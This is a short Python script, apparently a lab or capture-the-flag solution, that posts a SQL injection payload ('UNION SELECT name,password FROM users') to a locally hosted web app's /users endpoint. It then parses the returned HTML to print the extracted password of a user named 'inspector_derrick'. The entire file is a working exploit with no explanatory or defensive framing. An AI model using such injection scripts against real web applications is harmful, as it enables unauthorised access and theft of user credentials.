import requests
import bs4

addr = "http://0.0.0.0:5001"
url = addr + "/users"

payload = {"name": "somebodynotindatabase' UNION SELECT name,password FROM users WHERE name = 'inspector_derrick"}
r = requests.post(url, data=payload)

soup = bs4.BeautifulSoup(r.text, "html.parser")

for entry in soup.find_all("p", {"class": "list-group-item"}):
    username, password = entry.text.split(":", 1)
    print("The password of >{}< is >{}<".format(username, password))